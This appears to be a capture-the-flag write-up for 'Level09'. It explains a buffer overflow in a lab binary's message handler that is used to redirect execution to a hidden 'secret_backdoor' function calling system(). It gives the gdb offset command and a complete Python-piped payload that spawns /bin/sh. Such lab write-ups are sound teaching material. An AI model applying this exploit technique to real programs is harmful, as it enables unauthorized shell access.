# Level09

## What the binary does
After reversing the binary, we can see it lets you input a username, then a message to send.
Looking deeper in the code and functions, we can see a function `secret_backdoor` that gets a string in the standard entry, and executes it with a call on the system function. 

So our goal is to jump on the `secret_backdoor` function.

## Finding the exploit
The buffer inside the `handle_msg` function is not secure and dangerous because it is initialized with a size of 140, stores a value at buffer[180] and then, in the `set_username` function it stores our input from buffer[140] to buffer[181].
In the `set_msg` function, the call on strcpy does copy the variable `message` in our buffer with the size of the value stored at buffer[180].
We then will have to store a big value (```\xff```) in buffer[180] so we will be able to overflow on the return address in the set_username function.

## Finding the offset
To find the offset, we once again use the buffer overflow pattern generator tool from Wiremask.
In gdb : 
```(python -c 'print "A" * 40 + "\xd0"'; python -c 'print "OVERFLOW PATTERN"';)```
This command segfault at  ```0x4138674137674136```, which gives us an offset of 200.

## Crafting the payload
To find the address of the `secret_backdoor` function, we run the program with gdb after breaking on the main function. Then we can see its address is : 0x000055555555488c
In little endian, the address is : \x8c\x48\x55\x55\x55\x55\x00\x00
We also have to provide the command we want to execute : ```/bin/sh```.

## Final payload
So the final payload is :
```(python -c 'print "A" * 40 + "\xff"'; python -c 'print "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; python -c 'print "/bin/sh"'; cat) | ./level09```